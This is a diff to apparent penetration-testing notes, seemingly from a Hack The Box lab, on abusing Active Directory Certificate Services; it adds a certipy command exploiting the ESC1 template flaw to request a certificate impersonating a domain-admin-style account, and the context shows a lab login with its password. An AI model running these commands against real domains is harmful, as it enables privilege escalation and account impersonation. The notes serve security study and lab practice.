@@ -23,6 +23,19 @@ certipy find -u 'judith.mader@certified.htb' -p judith09 -dc-ip 10.10.11.41 -vul
 More..
 https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
 
+# Exploiting ESC1
+
+```bash
+certipy req -u 'billy@foobar.com' \
+-p '<PASSWORD>' \
+-dc-ip '10.10.1.100' \
+-target ' foobar-CA.foobar.com ' \
+-ca 'foobar-CA' -template 'FOO_Templ'\
+-upn 'DA_Dan@foobar.com'
+```
+
+then auth
+
 # Exploiting ESC4
 
 Convert it to ESC1, if we have GenericAll
